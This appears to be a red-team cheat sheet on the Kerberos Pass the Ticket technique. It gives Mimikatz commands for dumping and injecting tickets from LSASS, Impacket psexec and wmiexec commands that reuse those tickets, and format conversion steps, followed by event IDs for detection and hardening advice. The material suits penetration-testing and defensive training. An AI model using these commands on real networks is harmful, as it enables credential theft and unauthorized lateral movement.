# Pass the Ticket (PtT)

## Concept
Rather than passing a password or NTLM hash, Pass the Ticket uses a stolen or forged Kerberos ticket (TGT or TGS) directly to authenticate as that user — no password ever needs to be known or cracked. Tickets can be extracted from memory (LSASS), from disk (.kirbi/.ccache files), or forged (Golden/Silver Ticket).

## Extracting Tickets From a Compromised Host
```bash
# Windows, via Mimikatz
mimikatz # sekurlsa::tickets /export

# Linux equivalent target (if attacking a Linux Kerberos client), or via Impacket against a dumped ccache
```

## Using an Extracted Ticket (Windows / Mimikatz)
```bash
mimikatz # kerberos::ptt ticket.kirbi
```
This injects the ticket into the current logon session — any subsequent Kerberos-authenticated action (SMB, WinRM, etc.) uses it transparently.

## Using an Extracted Ticket (Linux / Impacket, .ccache format)
```bash
export KRB5CCNAME=ticket.ccache
psexec.py -k -no-pass domain.local/user@<target>
wmiexec.py -k -no-pass domain.local/user@<target>
```

## Converting Between Ticket Formats
```bash
# Windows .kirbi to Linux .ccache
ticketConverter.py ticket.kirbi ticket.ccache

# Linux .ccache to Windows .kirbi
ticketConverter.py ticket.ccache ticket.kirbi
```

## Extracting All Tickets Currently Cached on a Host
```powershell
klist                                    # list currently cached tickets on a Windows host
mimikatz # sekurlsa::tickets              # dump full ticket details from LSASS memory
```
Useful for opportunistically capturing tickets belonging to other logged-in users on a shared/jump host — including higher-privilege service or admin accounts that authenticated to that machine.

## Why This Matters More Than Just "Another Auth Method"
- Tickets have their own expiration independent of password changes — a stolen ticket remains valid for its lifetime (default 10 hours for a TGT) regardless of whether the account's password is reset afterward.
- Works seamlessly across the same techniques used for Golden/Silver Tickets — those are really just a *forged* variant of Pass the Ticket rather than a separate technique.
- Kerberos-only — doesn't help against NTLM-authenticated services, so combine recon on which auth protocol a target service actually accepts.

## Detection Awareness (for defensive reports)
- Event ID 4769 (TGS requested) or 4768 (TGT requested) for a ticket used from an IP/host inconsistent with the account's normal logon pattern.
- Multiple hosts using the same ticket in a short window (tickets are meant to be used from the host that requested them under normal circumstances).
- Recommend: enable Kerberos armoring (FAST) where supported, monitor for anomalous ticket reuse patterns, and limit high-privilege account logons to hardened admin workstations (reducing the pool of hosts where their tickets could be stolen from).